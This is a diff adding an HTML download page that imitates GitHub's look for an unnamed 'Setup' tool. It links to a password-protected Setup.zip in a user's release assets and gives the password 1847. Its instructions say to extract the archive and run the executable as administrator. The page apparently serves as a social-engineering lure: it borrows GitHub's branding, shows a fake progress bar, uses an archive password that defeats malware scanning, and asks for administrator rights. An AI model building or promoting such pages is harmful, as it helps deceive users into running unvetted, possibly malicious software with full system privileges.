@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MJMZR32XDF"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-MJMZR32XDF');
+</script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Setup Download</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <main class="page-shell">
+    <section class="panel">
+      <header class="panel-header">
+        <div class="brand">
+          <div class="brand-mark">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="currentColor" d="M12 .5C5.648.5.5 5.648.5 12A11.5 11.5 0 0 0 8.36 22.07c.58.107.79-.252.79-.56 0-.277-.01-1.01-.016-1.984-3.183.691-3.855-1.533-3.855-1.533-.52-1.322-1.27-1.674-1.27-1.674-1.038-.71.079-.696.079-.696 1.148.08 1.75 1.18 1.75 1.18 1.018 1.746 2.67 1.24 3.321.948.103-.737.398-1.241.724-1.527-2.54-.289-5.21-1.27-5.21-5.654 0-1.249.446-2.27 1.177-3.07-.118-.289-.51-1.452.112-3.026 0 0 .96-.307 3.143 1.173A10.93 10.93 0 0 1 12 6.03c.975.005 1.958.132 2.877.387 2.182-1.48 3.14-1.173 3.14-1.173.624 1.574.232 2.737.114 3.026.733.8 1.175 1.821 1.175 3.07 0 4.395-2.674 5.362-5.222 5.646.41.352.776 1.046.776 2.108 0 1.523-.013 2.751-.013 3.125 0 .311.209.673.797.559A11.502 11.502 0 0 0 23.5 12C23.5 5.648 18.352.5 12 .5Z"/>
+            </svg>
+          </div>
+          <div class="brand-text">
+            <span class="brand-name">GitHub</span>
+            <span class="brand-slash">/</span>
+            <span class="brand-repo">Setup</span>
+            <span class="brand-badge">Public</span>
+          </div>
+        </div>
+      </header>
+
+      <div class="panel-body">
+        <div class="progress-wrap" id="progressWrap">
+          <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+          <p class="progress-text" id="progressText">Preparing download...</p>
+        </div>
+
+        <div class="actions">
+          <a class="button button-primary" id="downloadBtn" href="https://github.com/Sonickyonozzle/downloader/releases/download/Setup/Setup.zip" download>
+            <span class="button-icon">↓</span>
+            <span>Download</span>
+          </a>
+          <button class="button button-secondary" id="instructionsBtn" type="button">
+            <span class="button-icon">📖</span>
+            <span>Instructions</span>
+          </button>
+        </div>
+
+        <div class="password-card">
+          <span class="password-label">Archive password:</span>
+          <strong class="password-value" id="passwordValue">1847</strong>
+          <button class="copy-button" id="copyBtn" type="button">Copy</button>
+        </div>
+
+        <dl class="meta-list">
+          <div class="meta-row">
+            <dt>Version</dt>
+            <dd>Latest [April, 2026 / v4.6.1]</dd>
+          </div>
+          <div class="meta-row">
+            <dt>File</dt>
+            <dd>Setup.zip</dd>
+          </div>
+          <div class="meta-row">
+            <dt>Platform</dt>
+            <dd>Windows 7 / 8 / 10 / 11 (x86 &amp; x64)</dd>
+          </div>
+          <div class="meta-row">
+            <dt>Size</dt>
+            <dd>≈ 106.5 MB</dd>
+          </div>
+          <div class="meta-row">
+            <dt>Requirements</dt>
+            <dd>2 GB RAM • 50 MB free space • Internet connection</dd>
+          </div>
+        </dl>
+
+        <p class="footer-note">© 2026 Repository Downloader • Hosted on GitHub</p>
+      </div>
+    </section>
+  </main>
+
+  <div class="modal-backdrop hidden" id="modalBackdrop" aria-hidden="true">
+    <section class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <div class="modal-header">
+        <h2 id="modalTitle">Installation Instructions</h2>
+        <button class="modal-close" id="modalClose" type="button" aria-label="Close">×</button>
+      </div>
+      <div class="modal-content">
+        <div class="instruction-step">
+          <h3>1. Extract the archive</h3>
+          <p>Right-click <strong>Install.zip</strong> and choose <strong>"Extract All"</strong>.</p>
+          <p>Or use 7-Zip / WinRAR and extract it to a new folder.</p>
+        </div>
+        <div class="instruction-step">
+          <h3>2. Enter archive password</h3>
+          <p>Password: <span class="inline-password">1847</span></p>
+        </div>
+        <div class="instruction-step">
+          <h3>3. Run as administrator</h3>
+          <p>Right-click the executable and choose <strong>"Run as administrator"</strong>.</p>
+        </div>
+        <div class="instruction-step">
+          <h3>4. Complete setup</h3>
+          <p>Follow the setup wizard to finish installation.</p>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
